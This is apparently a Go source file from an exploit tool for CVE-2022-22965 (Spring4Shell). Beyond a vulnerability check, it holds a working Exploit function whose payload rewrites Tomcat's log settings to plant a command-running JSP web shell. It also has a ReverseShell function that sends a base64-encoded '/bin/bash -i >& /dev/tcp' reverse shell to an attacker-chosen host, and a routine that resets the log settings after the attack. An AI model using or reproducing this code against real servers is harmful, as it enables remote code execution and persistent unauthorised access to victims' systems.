package common

import (
	"CVE-2022-22965/util"
	"encoding/base64"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"
)

/**
 * @Author Lockly
 * @Description //TODO
 * @Date 0:57 2023/6/4
 * @return
 **/

var (
	DefualtTimeout int64 = 10
	header               = map[string]string{
		"suffix": "%>//",
		"c1":     "Runtime",
		"c2":     "<%",
		"DNT":    "1",
	}
)

func Poc(u string) bool {
	if req, err := HttpRequset(u+"?class.module.classLoader%5b1%5d=1", "GET", "", DefualtTimeout, false, nil); err == nil {
		if req.StatusCode == 500 {
			if req2, err := HttpRequset(u+"?class.module.classLoader=1", "GET", "", DefualtTimeout, false, nil); err == nil {
				if req2.StatusCode == 200 {
					return true
				}
			}
		}
	}
	return false
}

func BatchPoc(u string, timeout int64, res chan<- string, wg *sync.WaitGroup) {
	if req, err := HttpRequset(u+"?class.module.classLoader%5b1%5d=1", "GET", "", timeout, false, nil); err == nil {
		if req.StatusCode == 500 {
			if req2, err := HttpRequset(u+"?class.module.classLoader=1", "GET", "", timeout, false, nil); err == nil {
				if req2.StatusCode == 200 {
					wg.Add(1)
					msg := fmt.Sprintf("%v Target %v exists CVE-2022-22965", util.CurrentTime, u)
					util.Log.LogInfo(msg)
					res <- msg
				}
			}
		}
	}
}

func Exploit(t string, c string) {
	var payload = "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	cmd := url.QueryEscape(c)
	payload1 := "/tomcatwar.jsp?pwd=j&cmd=" + cmd
	payload2 := "/tomcatwar.jsp"
	if test, err := HttpRequset(t+payload2, "GET", "", DefualtTimeout, false, header); err == nil {
		util.Log.LogDebug("Recieve status Code: " + strconv.Itoa(test.StatusCode))
		if test.StatusCode != 200 {
			if logreq, err := HttpRequset(t+payload, "GET", "", DefualtTimeout, false, header); err == nil {
				util.Log.LogDebug("Recieve status Code: " + strconv.Itoa(logreq.StatusCode))
				if logreq.StatusCode == 200 {
					util.Log.LogInfo("exploit completed!")
					util.Log.LogInfo("file path: " + t + payload1)
					util.Log.LogDebug("please wait for respone. it may take some times...")
					time.Sleep(time.Duration(20) * time.Second)
					if result, err := HttpRequset(t+payload1, "GET", "", DefualtTimeout, false, header); err == nil {
						if result.StatusCode == 200 {
							resetLog(t)
							util.Log.LogDebug("receieve command outputs: ")
							out := result.Body
							output := strings.Split(out, "//")
							fmt.Println()
							fmt.Println(output[0])
						} else {
							util.Log.LogError("Recieve status Code: " + strconv.Itoa(result.StatusCode))
							util.Log.LogDebug("404 may be caused by delay. just try again.")
						}
					}
				}
			}
		} else {
			util.Log.LogInfo("exploit completed!")
			util.Log.LogInfo("format shell file exsit")
			util.Log.LogInfo("file path: " + t + payload1)
			if result, err := HttpRequset(t+payload1, "GET", "", DefualtTimeout, false, header); err == nil {
				out := result.Body
				output := strings.Split(out, "//")
				resetLog(t)
				util.Log.LogInfo("receieve cmd outputs: ")
				fmt.Println()
				fmt.Println(output[0])
			}
		}
	}

}

func ReverseShell(target string, port int, host string) {
	u := "/tomcatwar.jsp?pwd=j&cmd="
	sh := "/bin/bash -i >& /dev/tcp/" + host + "/" + strconv.Itoa(port) + " 0>&1"
	util.Log.LogDebug("reverse command: " + sh)
	encodedSh := base64.StdEncoding.EncodeToString([]byte(sh))
	shell := fmt.Sprintf("echo %s | base64 -d | bash -i", encodedSh)
	finalshell := url.QueryEscape(shell)
	payload := target + u + finalshell
	if result, err := HttpRequset(payload, "GET", "", DefualtTimeout, false, header); err == nil {
		if result.StatusCode == 200 {
			util.Log.LogInfo("reverse shell successfully!")
		}
	}
}

func resetLog(url string) {
	if resetting, err := HttpRequset(url+"/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=", "GET", "", DefualtTimeout, false, nil); err == nil {
		if resetting.StatusCode == 200 {
			util.Log.LogInfo("reset log variables done")
		} else {
			util.Log.LogError("failed to reset log variables")
		}
	}
}
